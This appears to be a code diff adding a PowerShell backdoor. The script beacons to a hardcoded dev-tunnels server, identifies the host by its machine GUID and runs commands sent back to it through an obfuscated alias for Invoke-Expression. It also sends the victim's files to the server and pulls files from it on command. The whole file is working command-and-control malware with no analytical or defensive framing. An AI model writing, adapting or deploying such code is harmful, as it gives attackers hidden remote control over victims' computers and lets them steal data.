@@ -1,0 +1,80 @@
+##################################### Get Address of server ###################################
+$serverUrl = "https://88p3vxw2.asse.devtunnels.ms:8080/";
+write-host $serverUrl;
+##################################### Variable declaration  ###################################
+$buffer = New-Object Byte[] 1024;
+$x = "n-eiorvsxpk5";
+Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);
+$guid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography").MachineGuid;
+$output = "";
+$buffer = "";
+##################################### Upload ###################################################
+function upload($filePath) {
+    $boundary = [System.Guid]::NewGuid().ToString();
+    $bodyLines = @(
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path -Leaf $filePath)`"",
+        "Content-Type: application/octet-stream",
+        "",
+        $(Get-Content $filePath -Raw),
+        "--$boundary--"
+    );
+    $body = $bodyLines -join "`r`n";
+    Invoke-RestMethod -Uri $serverUrl"upload" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body;
+}
+###################################### Download ################################################
+function download($filePath) {
+    $body = @{
+            filepath = $filePath
+        } | ConvertTo-Json;
+    $filename = $(Split-Path -Leaf $filePath);
+    Invoke-WebRequest -Uri $serverUrl"download" -Method Post -ContentType "application/json" -Body $body -OutFile $filename;
+}
+##################################### Connection Loop ################################################
+$idle = $true;
+while($true) {
+    if ($idle) {
+
+        Start-Sleep -Seconds 60;
+        $body = @{
+            guid = $guid
+        } | ConvertTo-Json;
+        # Send a Post request
+        try {
+        $response = Invoke-RestMethod -Uri $serverUrl"connect" -Method POST -Body $body -ContentType "application/json";
+        if ($response) {
+            $idle = $false
+            $output = "PS " + (Get-Location).Path + "> ";
+        }
+        } catch {}
+    }
+    else {
+        try {
+            $body = @{
+                guid = $guid
+                message = $output
+            } | ConvertTo-Json
+            $response = Invoke-RestMethod -Uri $serverUrl"sport" -Method POST -Body $body -ContentType "application/json";
+        } catch {
+            $idle = $true
+            continue;
+        }
+        if ($response) {
+            $buffer = $response.text;
+            if ($buffer -eq "$#!+"){
+                $idle = $true;
+                continue;
+            }
+            if ($buffer.StartsWith("download")) { ## Upload to Server
+                upload($buffer.split(" ", 2)[-1]);
+                $buffer = "cd";
+            }
+            elseif ($buffer.StartsWith("upload")) { ## Download from server
+                download($buffer.split(" ", 2)[-1]);
+                $buffer = "cd";
+            }
+            $err = $($out = & n-eiorvsxpk5 $buffer) 2>&1;
+            $output = ($err | Out-String ) + ($out | Out-String) + "PS " + (Get-Location).Path + "> ";
+        }
+    }
+}
